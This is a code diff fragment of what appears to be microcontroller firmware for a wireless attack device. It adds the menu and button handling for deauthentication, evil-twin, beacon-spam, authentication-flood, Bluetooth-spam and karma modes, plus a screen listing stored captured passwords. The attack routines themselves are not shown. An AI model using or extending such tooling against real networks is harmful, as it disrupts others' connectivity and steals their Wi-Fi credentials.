+          break;
+        case 3:
+          currentState = PROBE_SNIFF;
+          startProbeSniffer();
+          drawProbeSniff(0);
+          break;
+        case 4:
+          currentState = GLOBAL_DEAUTH;
+          startGlobalDeauth();
+          drawGlobalDeauth(0);
+          break;
+        case 6:
+          currentState = BT_SPAM;
+          startBTSpam();
+          drawBTSpam(0);
+          break;
+        case 7:
+          currentState = VIEW_PASSWORDS;
+          viewSelection = 0; viewScrollPos = 0; confirmDeleteAll = false;
+          if (prefs.getInt("pwd_count", 0) == 0) viewSelection = 1;
+          drawViewPasswords();
+          break;
+        case 8:
+          currentState = KARMA_SCAN;
+          startKarmaScan();
+          drawKarmaScan(0);
+          break;
+      }
+    }
+  }
+  else if (currentState == AP_LIST_DEAUTH ||
+           currentState == AP_LIST_EVIL_TWIN ||
+           currentState == AP_LIST_AUTH_FLOOD) {
+    handleAPListNavigation();
+  }
+  else if (currentState == TEMPLATE_SELECT) {
+    handleTemplateSelect();
+  }
+  else if (currentState == DEAUTH_MENU) {
+    if (digitalRead(BTN_BOTTOM) == LOW) {
+      delay(200);
+      if (isDeauthRunning) stopDeauthEngine(); else startDeauthEngine();
+      drawDeauthMenu();
+    }
+    if (digitalRead(BTN_TOP) == LOW) {
+      delay(200);
+      if (isDeauthRunning) stopDeauthEngine();
+      currentState = MAIN_MENU; drawMainMenu();
+    }
+  }
+  else if (currentState == EVIL_TWIN_RUNNING) {
+    if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
+      delay(300);
+      stopEvilTwin();
+      verifyState = 0;
+      verifyAttempts = 0;
+      currentState = MAIN_MENU; drawMainMenu();
+    }
+  }
+  else if (currentState == BEACON_SPAM) {
+    if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
+      delay(300); stopBeaconSpam(); currentState = MAIN_MENU; drawMainMenu();
+    }
+  }
+  else if (currentState == PROBE_SNIFF) {
+    if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
+      delay(300); stopProbeSniffer(); currentState = MAIN_MENU; drawMainMenu();
+    }
+  }
+  else if (currentState == GLOBAL_DEAUTH) {
+    if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
+      delay(300); stopGlobalDeauth(); currentState = MAIN_MENU; drawMainMenu();
+    }
+  }
+  else if (currentState == AUTH_FLOOD_RUNNING) {
+    if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
+      delay(300); stopAuthFlood(); currentState = MAIN_MENU; drawMainMenu();
+    }
+  }
+  else if (currentState == BT_SPAM) {
+    if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
+      delay(300); stopBTSpam(); currentState = MAIN_MENU; drawMainMenu();
+    }
+  }
+  else if (currentState == VIEW_PASSWORDS) {
+    int total = prefs.getInt("pwd_count", 0);
+    int maxSelection = total + 1;
+    if (digitalRead(BTN_TOP) == LOW) {
+      delay(200); confirmDeleteAll = false;
+      viewSelection++;
+      if (viewSelection > maxSelection) viewSelection = 0;
+      if (viewSelection < total) {
+        if (viewSelection >= viewScrollPos + 2) viewScrollPos = viewSelection - 1;
+        else if (viewSelection < viewScrollPos) viewScrollPos = viewSelection;
+      }
+      drawViewPasswords();
+    }
+    if (digitalRead(BTN_BOTTOM) == LOW) {
+      delay(200);
+      if (viewSelection == maxSelection) { currentState = MAIN_MENU; drawMainMenu(); }
+      else if (viewSelection == total) {
+        if (!confirmDeleteAll) { confirmDeleteAll = true; lastDeletePress = millis(); drawViewPasswords(); }
+        else { deleteAllPasswordsFromNVS(); confirmDeleteAll = false; viewSelection = 1; viewScrollPos = 0; drawViewPasswords(); }
+      }
+    }
+    if (confirmDeleteAll && millis() - lastDeletePress > 3000) {
+      confirmDeleteAll = false; drawViewPasswords();
+    }
+  }
+}
